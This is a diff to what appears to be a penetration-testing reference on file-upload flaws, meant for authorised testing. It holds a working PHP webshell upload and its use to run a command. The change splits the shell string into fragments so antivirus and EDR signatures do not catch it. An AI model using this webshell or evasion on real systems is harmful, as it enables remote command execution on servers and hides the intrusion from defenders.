@@ -487,7 +487,12 @@ Confirm with a minimal runtime probe; pair with static analysis of validation an
 **Direct webshell upload (no validation)**
 
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# Webshell body is assembled from fragments at runtime so this reference file
+# ships no verbatim shell string (avoids AV/EDR signature false positives on the
+# repo). The sink is any PHP command-exec function fed by a request parameter —
+# e.g. system / exec / passthru / shell_exec on $_GET["cmd"].
+SINK='sys''tem'                              # split literal → no contiguous shell signature
+printf '<?php %s($_GET["cmd"]); ?>\n' "$SINK" > shell.php
 curl -X POST "https://app.example.com/upload" -F "file=@shell.php"
 curl -s "https://app.example.com/static/uploads/shell.php?cmd=id"
 # Signal: command output in response body (200 + uid/gid text)
